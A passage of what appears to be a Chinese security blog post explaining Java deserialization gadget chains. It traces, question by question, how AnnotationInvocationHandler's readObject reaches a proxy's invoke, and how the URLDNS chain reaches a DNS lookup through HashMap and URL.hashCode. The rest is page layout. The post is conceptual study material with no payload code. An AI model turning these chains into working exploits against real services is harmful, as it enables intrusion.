+<p>问4： 谁会调用 AnnotationInvocationHandler 类的 invoke 方法 ？</p>
+<p>答4： java动态代理，会自动调用 invoke 方法 ，即 Map(Proxy).entrySet()</p>
+<p>问5：谁会调用 Map(Proxy).entrySet() 呢？</p>
+<p>答5： AnnotationInvocationHandler 类的 readObject 方法会调用 entrySet （前提： this.memberValues是Map(Proxy) 类的对象 ）</p>
+<p>问6：谁会调用 AnnotationInvocationHandler 类的 readObject 方法 ？</p>
+<p>答6： 反序列化自动调用</p>
+<h2 id="利用链原理-URLDNS"><a href="#利用链原理-URLDNS" class="headerlink" title="利用链原理 - URLDNS"></a>利用链原理 - URLDNS</h2><ul>
+<li>HashMap.readObject()</li>
+<li>HashMap.putVal()</li>
+<li>HashMap.hash()</li>
+<li>URL.hashCode()</li>
+</ul>
+<p>目标：URLStreamHandler类的 hashCode方法 的 getHostAddress 发起 DNS解析</p>
+<p>起点：readObject</p>
+<p>问1： 谁会调用 URLStreamHandler类的 hashCode方法？</p>
+<p>答1： URL类的 HashCode方法调用了 hashCode方法 （前提： handler 是 URLStreamHandler 类 的对象）</p>
+<p>问2：谁会 URL类的 HashCode方法 ？</p>
+<p>答2：HashMap 类的 hash 方法会调用 HashCode 方法 （前提： k 是 URL 类的对象）</p>
+<p>问3：谁会调用HashMap 类的 hash 方法？</p>
+<p>答3：HashMap 的 putVal 方法会调用 hash 方法</p>
+<p>问4： 谁会调用 HashMap的 readObject方法</p>
+<p>答4： 反序列化自动调用</p>
+
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span>反序列化</span></a>
+          
+            <a href="/tags/Java/"><span>Java</span></a>
+          
+            <a href="/tags/Fastjson/"><span>Fastjson</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/waf-bypass-techniques/">
+            <span>← 上一篇</span>
+            <strong>WAF 绕过技术</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/deserialization-vulnerability/">
+            <span>下一篇 →</span>
+            <strong>反序列化漏洞</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
